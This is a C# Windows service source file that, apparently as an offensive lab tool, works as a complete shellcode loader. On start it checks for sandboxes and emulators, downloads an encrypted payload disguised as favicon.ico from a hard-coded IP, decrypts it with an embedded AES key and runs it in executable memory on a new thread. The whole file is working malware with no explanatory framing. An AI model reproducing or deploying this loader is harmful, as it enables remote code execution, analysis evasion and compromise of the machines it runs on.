using System;
using System.ServiceProcess;
using System.IO;
using System.Timers;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        System.Timers.Timer timer = new System.Timers.Timer();
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("Service is started at " + DateTime.Now);            
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 15000;
            timer.Enabled = true;
            Prepare("192.168.45.245");
        }

        protected override void OnStop()
        {
            WriteToFile("Service stopped at " + DateTime.Now);
        }
        
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            WriteToFile("Service is recall at " + DateTime.Now);
        }

        public void WriteToFile(string Message)
        {
            string filePath = "C:\\Temp\\log.txt";
            if (!File.Exists(filePath))
            {
                using (StreamWriter sw = File.CreateText(filePath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filePath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Unlock(byte[] locked, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform unlocker = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] unlocked;

                using (MemoryStream msDecrypt = new MemoryStream(locked))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, unlocker, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            unlocked = msPlain.ToArray();
                        }
                    }
                }

                return unlocked;
            }
        }

        public static void Prepare(string host)
        {
            byte[] key = new byte[] {
0x84,0xbf,0x38,0x84,0x7e,0x18,0x50,0x57,0xf9,0x0e,0x88,0xc2,
0x15,0x94,0xe6,0x98,0x8a,0xc8,0x88,0xfa,0x24,0x4d,0x2b,0xc2,
0x1a,0x4a,0x0e,0xe4,0x89,0xfc,0x4a,0x8a };
            byte[] iv = new byte[] {
0xb2,0x99,0xed,0x51,0x12,0xbd,0xd0,0x93,0x70,0x16,0x49,0x96,
0xcc,0x7a,0x95,0xaf };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            string remoteResource = $"http://{host}/favicon.ico";
            string fileContent = DownloadFile(remoteResource);
            Console.WriteLine($"starting download {remoteResource}");
            //var bytes_filecont = Encoding.UTF8.GetBytes(fileContent);
            byte[] fBt = ConvertHexStringToByteArray(fileContent);
            byte[] unlocked = Unlock(fBt, key, iv);

            TraditionalExec(unlocked);
        }

        public static void TraditionalExec(byte[] unlocked)
        {
            Console.WriteLine("Entering TraditionalExec");

            int size = unlocked.Length;
            uint sizeUint = (uint)size;

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, sizeUint, 0x3000, 0x40, 0);
            Marshal.Copy(unlocked, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            string path = @"C:\Temp\test.log";
            using (StreamWriter writer = new StreamWriter(path, true))
            {
                writer.WriteLine($"{DateTime.Now}: Executedc");
            }
            //WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        static string DownloadFile(string url)
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadString(url);
            }
        }

        static byte[] ConvertHexStringToByteArray(string hexString)
        {
            // Remove quebras de linha, espaços em branco e outros caracteres indesejados
            hexString = Regex.Replace(hexString, @"\s+|\n|\r", "");

            // Separa os elementos pela vírgula
            string[] hexValues = hexString.Split(',');

            // Inicializa o array de bytes
            byte[] bytes = new byte[hexValues.Length];

            // Converte cada valor hexadecimal para byte
            for (int i = 0; i < hexValues.Length; i++)
            {
                if (hexValues[i].StartsWith("0x"))
                {
                    hexValues[i] = hexValues[i].Substring(2); // Remove o prefixo "0x"
                }
                bytes[i] = Convert.ToByte(hexValues[i], 16);
            }

            return bytes;
        }
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new Service1()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
}
